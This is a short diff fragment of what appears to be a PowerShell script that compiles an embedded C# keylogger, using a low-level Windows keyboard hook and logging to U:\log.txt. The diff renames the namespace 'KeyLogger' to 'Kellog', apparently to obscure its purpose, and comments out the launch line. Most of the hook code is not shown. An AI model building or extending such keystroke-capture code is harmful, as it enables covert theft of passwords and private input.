@@ -6,7 +6,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
-namespace KeyLogger {
+namespace Kellog {
   public static class Program {
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
@@ -59,4 +59,4 @@ namespace KeyLogger {
 }
 "@ -ReferencedAssemblies System.Windows.Forms
 
-[KeyLogger.Program]::Main("U:\log.txt");
+#[Kellog.Program]::Main("U:\log.txt");
